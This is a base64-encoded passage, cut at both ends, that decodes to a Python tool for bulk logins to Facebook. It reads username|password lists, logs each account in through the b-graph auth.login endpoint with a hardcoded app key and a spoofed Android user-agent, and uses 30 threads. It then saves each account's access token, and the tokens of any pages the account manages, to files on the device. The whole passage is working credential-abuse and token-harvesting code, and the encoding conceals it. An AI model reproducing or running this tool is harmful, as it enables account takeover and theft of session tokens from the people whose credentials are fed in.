BcMDMzWzBtIikKICAgICAgICAgICAgc3VjY2Vzc19jb3VudC5hcHBlbmQodWlkKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KCJcMDMzWzE7Mzdt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgICAgIHByaW50KGYiICAgICBcMDMzWzMxbVtGQUlMRURdXDAzM1swbTogVE8gRVhUUkFDVCBBY2NvdW50IOKUgOKUgOKUgOKUgOKUgD4ge3VpZH0uIikKICAgICAgICAgICAgcHJpbnQoIlwwMzNbMTszN23ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZiIgICAgIFwwMzNbMTszMW1bRVJST1JdXDAzM1swbSBFcnJvciBleHRyYWN0aW5nIGFjY291bnQ6IHt1aWR9LiBSZWFzb246IHtzdHIoZSl9XDAzM1swbVxuIikKCgpkZWYgcHJveihhY2NvdW50c19maWxlLCB0b2tlbl9vdXRwdXRfcGF0aCwgZXh0cmFjdF90eXBlKToKICAgICIiIlByb2Nlc3MgdGhlIGFjY291bnRzIGFuZCBleHRyYWN0IHRva2VucyBjb25jdXJyZW50bHkuIiIiCiAgICBzdWNjZXNzX2NvdW50ID0gW10KCiAgICAjIExvYWQgZXhpc3RpbmcgdWlkcyBmcm9tIHRoZSBvdXRwdXQgZmlsZSB0byBhdm9pZCBkdXBsaWNhdGVzCiAgICBleGlzdGluZ191aWRzID0gc2V0KCkKICAgIGlmIG9zLnBhdGguZXhpc3RzKHRva2VuX291dHB1dF9wYXRoKToKICAgICAgICB3aXRoIG9wZW4odG9rZW5fb3V0cHV0X3BhdGgsICdyJykgYXMgZjoKICAgICAgICAgICAgZXhpc3RpbmdfdWlkcyA9IHtsaW5lLnNwbGl0KCd8JylbMF0gZm9yIGxpbmUgaW4gZi5yZWFkbGluZXMoKX0KCiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKGFjY291bnRzX2ZpbGUsICdyJykgYXMgZmlsZToKICAgICAgICAgICAgYWNjb3VudHMgPSBmaWxlLnJlYWRsaW5lcygpCgogICAgICAgIGFjY291bnRzID0gW2xpbmUuc3RyaXAoKSBmb3IgbGluZSBpbiBhY2NvdW50cyBpZiAnfCcgaW4gbGluZS5zdHJpcCgpXQoKICAgICAgICBpZiBub3QgYWNjb3VudHM6CiAgICAgICAgICAgIHByaW50KGYiTm8gdmFsaWQgYWNjb3VudHMgZm91bmQgaW4ge2FjY291bnRzX2ZpbGV9LiIpCiAgICAgICAgICAgIHJldHVybgoKICAgICAgICB3aXRoIHRocmVhZC5UaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MzApIGFzIGV4ZWN1dG9yOgogICAgICAgICAgICBmdXR1cmVzID0gW2V4ZWN1dG9yLnN1Ym1pdChiZ3JhcGgsIHVpZCwgcHcsIHRva2VuX291dHB1dF9wYXRoLCBleHRyYWN0X3R5cGUsIHN1Y2Nlc3NfY291bnQsIGV4aXN0aW5nX3VpZHMpCiAgICAgICAgICAgICAgICAgICAgICAgZm9yIHVpZCwgcHcgaW4gW2FjY291bnQuc3BsaXQoJ3wnKSBmb3IgYWNjb3VudCBpbiBhY2NvdW50c11dCgogICAgICAgICAgICBmb3IgZnV0dXJlIGluIGZ1dHVyZXM6CiAgICAgICAgICAgICAgICBmdXR1cmUucmVzdWx0KCkKCiAgICAgICAgcHJpbnQoIlwwMzNbMTszN23ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICBwcmludChmIiAgICAgXDAzM1sxOzM0bVtTVUNDRVNTXVwwMzNbMG06IHtsZW4oc3VjY2Vzc19jb3VudCl9IHtleHRyYWN0X3R5cGV9KHMpIHN1Y2Nlc3NmdWxseSBleHRyYWN0ZWQuIikKICAgICAgICBwcmludCgiXDAzM1sxOzM3beKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQoKICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoKICAgICAgICBwcmludChmIkZpbGUgbm90IGZvdW5kOiB7YWNjb3VudHNfZmlsZX0iKQogICAgICAgIHJldHVybgoKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCByYW5kb20KaW1wb3J0IGNvbmN1cnJlbnQuZnV0dXJlcyBhcyB0aHJlYWQKaW1wb3J0IG9zCmltcG9ydCBzdHJpbmcKCmZiYXYgPSBmJycne3JhbmRvbS5yYW5kaW50KDExMSwgOTk5KX0uMC4wLntyYW5kb20ucmFuZGludCgxMSwgOTkpfS57cmFuZG9tLnJhbmRpbnQoMTExLCA5OTkpfScnJwpmYmJ2ID0gc3RyKHJhbmRvbS5yYW5kaW50KDExMTExMTExMSwgOTk5OTk5OTk5KSkKZmJydiA9ICcwJwpyYW5kb21fc2VlZCA9IHJhbmRvbS5SYW5kb20oKQphZGlkID0gJycuam9pbihyYW5kb21fc2VlZC5jaG9pY2VzKHN0cmluZy5oZXhkaWdpdHMsIGs9MTYpKQp1YV9iZ3JhcGggPSAnW0ZCQU4vRkI0QTtGQkFWLycgKyBzdHIocmFuZG9tLnJhbmRpbnQoNDksIDY2KSkgKyAnLjAuMC4nICsgc3RyKHJhbmRvbS5yYW5kcmFuZ2UoMjAsIDQ5KSkgKyBzdHIocmFuZG9tLnJhbmRpbnQoMTEsIDk5KSkgKyAnO0ZCQlYvJyArIHN0cihyYW5kb20ucmFuZGludCgxMTExMTExMSwgNzc3Nzc3NzcpKSArICc7JyArICdbRkJBTi9GQjRBO0ZCQVYvJyArIGZiYXYgKyAnO0ZCQlYvJyArIGZiYnYgKyAnO0ZCRE0ve2RlbnNpdHk9My4wLHdpZHRoPTEwODAsaGVpZ2h0PTIxMDd9O0ZCTEMvZnJfRlI7RkJSVi8nICsgZmJydiArICc7RkJDUi9Pb3JlZG9vIFROO0ZCTUYvSFVBV0VJO0ZCQkQvSFVBV0VJO0ZCUE4vY29tLmZhY2Vib29rLmthdGFuYTtGQkRWL01BUi1MWDFNO0ZCU1YvOTtGQk9QLzE7RkJDQS9hcm02NC12OGE6XScKCmRlZiBsb2FkX2V4aXN0aW5nX3Rva2VucyhwYXRoX2ZpbGUpOgogICAgIiIiTG9hZCBleGlzdGluZyBhY2NvdW50cyBvciBwYWdlcyBmcm9tIHRoZSBvdXRwdXQgZmlsZS4iIiIKICAgIGlmIG9zLnBhdGguZXhpc3RzKHBhdGhfZmlsZSk6CiAgICAgICAgd2l0aCBvcGVuKHBhdGhfZmlsZSwgJ3InKSBhcyBmOgogICAgICAgICAgICByZXR1cm4ge2xpbmUuc3BsaXQoJ3wnKVswXSBmb3IgbGluZSBpbiBmLnJlYWRsaW5lcygpfSAgIyBTZXQgb2YgZXhpc3RpbmcgdWlkcyBvciBwYWdlIGlkcwogICAgcmV0dXJuIHNldCgpCgpkZWYgYmdyYXBoX3BhZ2UodWlkLCBwdywgcGF0aF9maWxlLCBleHRyYWN0X3R5cGUsIHN1Y2Nlc3NfY291bnQsIGV4aXN0aW5nX3Rva2Vucyk6CiAgICBhY2Nlc3NUb2tlbiA9ICczNTA2ODU1MzE3Mjh8NjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzInICAjIEV4YW1wbGUgdG9rZW4KICAgIAogICAgaWYgdWlkIGluIGV4aXN0aW5nX3Rva2VuczoKICAgICAgICBwcmludCgiXDAzM1sxOzM3beKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgIHByaW50KGYiICAgICB7d2hpdGV9QUNDT1VOVCDilIDilIDilIDilIDilIA+IHtyZWR9e3VpZH0ge2dyZWVufUFMUkVBRFkgRVhJU1RTIikKICAgICAgICByZXR1cm4KCiAgICBkYXRhID0gewogICAgICAgICdtZXRob2QnOiAnYXV0aC5sb2dpbicsCiAgICAgICAgJ2ZiX2FwaV9yZXFfZnJpZW5kbHlfbmFtZSc6ICdhdXRoZW50aWNhdGUnLAogICAgICAgICdmYl9hcGlfY2FsbGVyX2NsYXNzJzogJ2NvbS5mYWNlYm9vay5hY2NvdW50LmxvZ2luLnByb3RvY29sLkZiNGFBdXRoSGFuZGxlcicsCiAgICAgICAgJ2FwaV9rZXknOiAnNjJmOGNlOWY3NGIxMmY4NGMxMjNjYzIzNDM3YTRhMzInLAogICAgICAgICdlbWFpbCc6IHVpZCwKICAgICAgICAncGFzc3dvcmQnOiBwdywKICAgICAgICAnYWNjZXNzX3Rva2VuJzogYWNjZXNzVG9rZW4KICAgIH0KCiAgICB1cmwgPSAnaHR0cHM6Ly9iLWdyYXBoLmZhY2Vib29rLmNvbS9hdXRoL2xvZ2luP2luY2x1ZGVfaGVhZGVycz1mYWxzZSZkZWNvZGVfYm9keV9qc29uPWZhbHNlJnN0cmVhbWFibGVfanNvbl9yZXNwb25zZT10cnVlJwoKICAgIHRyeToKICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCBkYXRhPWRhdGEpLmpzb24oKQogICAgICAgIAogICAgICAgIGlmICdhY2Nlc3NfdG9rZW4nIGluIHJlc3BvbnNlOgogICAgICAgICAgICB0b2tlbiA9IHJlc3BvbnNlWydhY2Nlc3NfdG9rZW4nXQoKICAgICAgICAgICAgIyBFeHRyYWN0IEZhY2Vib29rIFBhZ2VzIGFzc29jaWF0ZWQgd2l0aCB0aGUgYWNjb3VudCB0b2tlbgogICAgICAgICAgICBwYWdlcyA9IGV4dHJhY3RfZmJfcGFnZXModG9rZW4pCiAgICAgICAgICAgIGlmIHBhZ2VzOgogICAgICAgICAgICAgICAgZm9yIHBhZ2UgaW4gcGFnZXM6CiAgICAgICAgICAgICAgICAgICAgcGFnZV9pZCA9IHBhZ2VbJ2lkJ10KICAgICAgICAgICAgICAgICAgICBpZiBwYWdlX2lkIG5vdCBpbiBleGlzdGluZ190b2tlbnM6CiAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbihwYXRoX2ZpbGUsICdhJykgYXMgZjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGYud3JpdGUoZiJ7cGFnZV9pZH18e3BhZ2VbJ2FjY2Vzc1Rva2VuJ119XG4iKQogICAgICAgICAgICAgICAgICAgICAgICBwcmludChmInt3aGl0ZX17dWlkfSAg4pSA4pSA4pSA4pSA4pSAPiB7Z3JlZW59UGFnZSBJRDoge3JlZH17cGFnZV9pZH0ge3llbGxvd31FWFRSQUNURUQgU1VDQ0VTU0ZVTExZIikKICAgICAgICAgICAgICAgICAgICAgICAgZXhpc3RpbmdfdG9rZW5zLmFkZChwYWdlX2lkKQogICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KGYie3doaXRlfUlEOiAge3BhZ2VfaWR9IOKUgOKUgOKUgOKUgOKUgD4ge2dyZWVufUFMUkVBRFkgRVhJU1RTICEgIikKCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBwcmludChmInt3aGl0ZX17dWlkfSDilIDilIDilIDilIDilIA+IHtyZWR9RE9FU04nVCBIQVZFIFBBR0VTICEiKQogICAgICAgICAgICAKICAgICAgICAgICAgc3VjY2Vzc19jb3VudC5hcHBlbmQodWlkKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KGYie3doaXRlfXt1aWR9ICDilIDilIDilIDilIDilIA+IHtyZWR9RkFJTEVEIFRPIEVYVFJBQ1QgISAiKQoKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChmIltFUlJPUl0gRXJyb3IgZXh0cmFjdGluZyBhY2NvdW50OiB7dWlkfS4gUmVhc29uOiB7c3RyKGUpfSIpCgpkZWYgZXh0cmFjdF9mYl9wYWdlcyh0b2tlbik6CiAgICB1cmwgPSAnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjE4LjAvbWUvYWNjb3VudHMnCiAgICBoZWFkZXJzID0gewogICAgICAgICdBdXRob3JpemF0aW9uJzogZidCZWFyZXIge3Rva2VufScKICAgIH0KICAgIAogICAgcGFnZXNfZGF0YSA9IFtdCiAgICAKICAgIHdoaWxlIHVybDoKICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwsIGhlYWRlcnM9aGVhZGVycykKICAgICAgICAKICAgICAgICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSAhPSAyMDA6CiAgICAgICAgICAgIHByaW50KGYnRXJyb3I6IHtyZXNwb25zZS50ZXh0fScpCiAgICAgICAgICAgIHJldHVybiBOb25lCiAgICAgICAgCiAgICAgICAgZGF0YSA9IHJlc3BvbnNlLmpzb24oKQogICAgICAgIGZvciBwYWdlIGluIGRhdGEuZ2V0KCdkYXRhJywgW10pOgogICAgICAgICAgICBwYWdlc19kYXRhLmFwcGVuZCh7CiAgICAgICAgICAgICAgICAnaWQnOiBwYWdlLmdldCgnaWQnKSwKICAgICAgICAgICAgICAgICdhY2Nlc3NUb2tlbic6IHBhZ2UuZ2V0KCdhY2Nlc3NfdG9rZW4nKQogICAgICAgICAgICB9KQogICAgICAgIAogICAgICAgIHVybCA9IGRhdGEuZ2V0KCdwYWdpbmcnLCB7fSkuZ2V0KCduZXh0JykgICMgVXBkYXRlIHRoZSBVUkwgZm9yIHRoZSBuZXh0IHJlcXVlc3QKCiAgICByZXR1cm4gcGFnZXNfZGF0YQoKZGVmIHByb3pjKGFjY291bnRzX2ZpbGUsIHRva2VuX291dHB1dF9wYXRoLCBleHRyYWN0X3R5cGUpOgogICAgc3VjY2Vzc19jb3VudCA9IFtdCiAgICBleGlzdGluZ190b2tlbnMgPSBsb2FkX2V4aXN0aW5nX3Rva2Vucyh0b2tlbl9vdXRwdXRfcGF0aCkKCiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKGFjY291bnRzX2ZpbGUsICdyJykgYXMgZmlsZToKICAgICAgICAgICAgYWNjb3VudHMgPSBmaWxlLnJlYWRsaW5lcygpCgogICAgICAgIGFjY291bnRzID0gW2xpbmUuc3RyaXAoKSBmb3IgbGluZSBpbiBhY2NvdW50cyBpZiAnfCcgaW4gbGluZS5zdHJpcCgpXQoKICAgICAgICBpZiBub3QgYWNjb3VudHM6CiAgICAgICAgICAgIHByaW50KGYiTm8gdmFsaWQgYWNjb3VudHMgZm91bmQgaW4ge2FjY291bnRzX2ZpbGV9LiIpCiAgICAgICAgICAgIHJldHVybgoKICAgICAgICB3aXRoIHRocmVhZC5UaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MzApIGFzIGV4ZWN1dG9yOgogICAgICAgICAgICBmdXR1cmVzID0gW2V4ZWN1dG9yLnN1Ym1pdChiZ3JhcGhfcGFnZSwgdWlkLCBwdywgdG9rZW5fb3V0cHV0X3BhdGgsIGV4dHJhY3RfdHlwZSwgc3VjY2Vzc19jb3VudCwgZXhpc3RpbmdfdG9rZW5zKQogICAgICAgICAgICAgICAgICAgICAgIGZvciB1aWQsIHB3IGluIFthY2NvdW50LnNwbGl0KCd8JykgZm9yIGFjY291bnQgaW4gYWNjb3VudHNdXQoKICAgICAgICAgICAgZm9yIGZ1dHVyZSBpbiBmdXR1cmVzOgogICAgICAgICAgICAgICAgZnV0dXJlLnJlc3VsdCgpCgogICAgICAgIHByaW50KCJcMDMzWzE7Mzdt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgcHJpbnQoZiIgICAgIFwwMzNbMTszNG1bU1VDQ0VTU11cMDMzWzBtOiB7bGVuKHN1Y2Nlc3NfY291bnQpfSB7ZXh0cmFjdF90eXBlfShzKSBzdWNjZXNzZnVsbHkgZXh0cmFjdGVkLiIpCiAgICAgICAgcHJpbnQoIlwwMzNbMTszN23ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKCiAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6CiAgICAgICAgcHJpbnQoZiJGaWxlIG5vdCBmb3VuZDoge2FjY291bnRzX2ZpbGV9IikKZGVmIGV4dHJhY3Rpb24oKToKCiAgICBjbGVhcl9zY3JlZW4oKQogICAgam92YW4oKQogICAgcHJpbnQoZiIgICAgIHt3aGl0ZX1bMV0ge3llbGxvd31FWFRSQUNUIHtyZWR9QUNDT1VOVCIpCiAgICBwcmludChmIiAgICAge3doaXRlfVsyXSB7eWVsbG93fUVYVFJBQ1Qge3JlZH1QQUdFUyIpCiAgICBwcmludCgiICAgICBcMDMzWzE7MzRt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBjaG9pY2UgPSBpbnB1dChmIiAgICAge2dyZWVufUNIT0lDRTogIikuc3RyaXAoKSAKICAgIGlmIGNob2ljZSA9PSAnMSc6CiAgICAgICAgYXhsMSgpCiAgICBlbGlmIGNob2ljZSA9PSAnMic6CiAgICAgICAgYXhsMigpCiAgICBlbHNlOgogICAgICAgIHByaW50KGYiICAgICB7cmVkfUlOVkFMSUQgQ0hPSUNFIikKZGVmIGF4bDIoKToKICAgIGNsZWFyX3NjcmVlbigpCiAgICBqb3ZhbigpCiAgICBmb2xkZXJfcGF0aCA9ICIvc2RjYXJkL2Jvb3N0cGhlcmUiICAKICAgIHByaW50KGYiICAgIFwwMzNbMzRt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBwcmludChmIiAgICAgXDAzM1szMW1bMDFdIFwwMzNbMzJtRlJBIEVYVFJBQ1QgQUNDT1VOVCIpCiAgICBwcmludChmIiAgICAgXDAzM1szMW1bMDJdIFwwMzNbMzJtRlJBIEVYVFJBQ1QgUEFHRVMiKQogICAgcHJpbnQoZiIgICAgIFwwMzNbMzFtWzAzXSBcMDMzWzMybVJQVyBFWFRSQUNUIEFDQ09VTlQiKQogICAgcHJpbnQoZiIgICAgIFwwMzNbMzFtWzA0XSBcMDMzWzMybVJQVyBFWFRSQUNUIFBBR0VTIikKICAgIHByaW50KGYiICAgIFwwMzNbMzRt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBzYXZlX2Nob2ljZSA9IGlucHV0KGYiICAgICBcMDMzWzMybUNIT0lDRTogIikuc3RyaXAoKQoKICAgIGlmIHNhdmVfY2hvaWNlID09ICcxJzoKICAgICAgICBhY2NvdW50X2ZpbGUgPSBvcy5wYXRoLmpvaW4oZm9sZGVyX3BhdGgsICJGUkFBQ0NPVU5ULnR4dCIpCiAgICAgICAgZXh0cmFjdF90eXBlID0gJ2FjY291bnQnCiAgICBlbGlmIHNhdmVfY2hvaWNlID09ICcyJzoKICAgICAgICBhY2NvdW50X2ZpbGUgPSBvcy5wYXRoLmpvaW4oZm9sZGVyX3BhdGgsICJGUkFQQUdFUy50eHQiKQogICAgICAgIGV4dHJhY3RfdHlwZSA9ICdwYWdlJwogICAgZWxpZiBzYXZlX2Nob2ljZSA9PSAnMyc6CiAgICAgICAgYWNjb3VudF9maWxlID0gb3MucGF0aC5qb2luKGZvbGRlcl9wYXRoLCAiUlBXQUNDT1VOVC50eHQiKQogICAgICAgIGV4dHJhY3RfdHlwZSA9ICdhY2NvdW50JwogICAgZWxpZiBzYXZlX2Nob2ljZSA9PSAnNCc6CiAgICAgICAgYWNjb3VudF9maWxlID0gb3MucGF0aC5qb2luKGZvbGRlcl9wYXRoLCAiUlBXUEFHRVMudHh0IikKICAgICAgICBleHRyYWN0X3R5cGUgPSAncGFnZScKICAgIGVsc2U6CiAgICAgICAgcHJpbnQoIkludmFsaWQgY2hvaWNlLiBFeGl0aW5nLiIpCiAgICAgICAgcmV0dXJuCgogICAgcHJpbnQoZiIgICAgXDAzM1szNG3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIHByaW50KGYiICAgICBcMDMzWzMzbVRIRSBGT1JNQVQgU0hPVUxEIEJFIFwwMzNbMzFtdWlkfHBhc3MiKQogICAgcHJpbnQoZiIgICAgXDAzM1szNG3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIGZpbGVfcGF0aCA9IGlucHV0KGYiICAgICBcMDMzWzMzbVBBVEg6ICIpLnN0cmlwKCkKCiAgICBwcm96YyhmaWxlX3BhdGgsIGFjY291bnRfZmlsZSwgZXh0cmFjdF90eXBlKQpkZWYgYXhsMSgpOgogICAgY2xlYXJfc2NyZWVuKCkKICAgIGpvdmFuKCkKICAgIGZvbGRlcl9wYXRoID0gIi9zZGNhcmQvYm9vc3RwaGVyZSIKICAgIHByaW50KGYiICAgIFwwMzNbMzRt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBwcmludChmIiAgICAgXDAzM1szMW1bMDFdIFwwMzNbMzJtRlJBIEVYVFJBQ1QgQUNDT1VOVCIpCiAgICBwcmludChmIiAgICAgXDAzM1szMW1bMDJdIFwwMzNbMzJtRlJBIEVYVFJBQ1QgUEFHRVMiKQogICAgcHJpbnQoZiIgICAgIFwwMzNbMzFtWzAzXSBcMDMzWzMybVJQVyBFWFRSQUNUIEFDQ09VTlQiKQogICAgcHJpbnQoZiIgICAgIFwwMzNbMzFtWzA0XSBcMDMzWzMybVJQVyBFWFRSQUNUIFBBR0VTIikKICAgIHByaW50KGYiICAgIFwwMzNbMzRt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBzYXZlX2Nob2ljZSA9IGlucHV0KGYiICAgICBcMDMzWzMybUNIT0lDRTogIikuc3RyaXAoKQoKICAgIGlmIHNhdmVfY2hvaWNlID09ICcxJzoKICAgICAgICBhY2NvdW50X2ZpbGUgPSBvcy5wYXRoLmpvaW4oZm9sZGVyX3BhdGgsICJGUkFBQ0NPVU5ULnR4dCIpCiAgICAgICAgZXh0cmFjdF90eXBlID0gJ2FjY291bnQnCiAgICBlbGlmIHNhdmVfY2hvaWNlID09ICcyJzoKICAgICAgICBhY2NvdW50X2ZpbGUgPSBvcy5wYXRoLmpvaW4oZm9sZGVyX3BhdGgsICJGUkFQQUdFUy50eHQiKQogICAgICAgIGV4dHJhY3RfdHlwZSA9ICdwYWdlJwogICAgZWxpZiBzYXZlX2Nob2ljZSA9PSAnMyc6CiAgICAgICAgYWNjb3VudF9maWxlID0gb3MucGF0aC5qb2luKGZvbGRlcl9wYXRoLCAiUlBXQUNDT1VOVC50eHQiKQogICAgICAgIGV4dHJhY3RfdHlwZSA9ICdhY2NvdW50JwogICAgZWxpZiBzYXZlX2Nob2ljZSA9PSAnNCc6CiAgICAgICAgYWNjb3VudF9maWxlID0gb3MucGF0aC5qb2luKGZvbGRlcl9wYXRoLCAiUlBXUEFHRVMudHh0IikKICAgICAgICBleHRyYWN0X3R5cGUgPSAncGFnZScKICAgIGVsc2U6CiAgICAgICAgcHJpbnQoIkludmFsaWQgY2hvaWNlLiBFeGl0aW5nLiIpCiAgICAgICAgcmV0dXJuCgogICAgcHJpbnQoZiIgICAgXDAzM1szNG3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIHByaW50KGYiICAgICBcMDMzWzMzbVRIRSBGT1JNQVQgU0hPVUxEIEJFIFwwMzNbMzFtdWlkfHBhc3MiKQogICAgcHJpbnQoZiIgICAgXDAzM1szNG3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIGZpbGVfcGF0aCA9IGlucHV0KGYiIC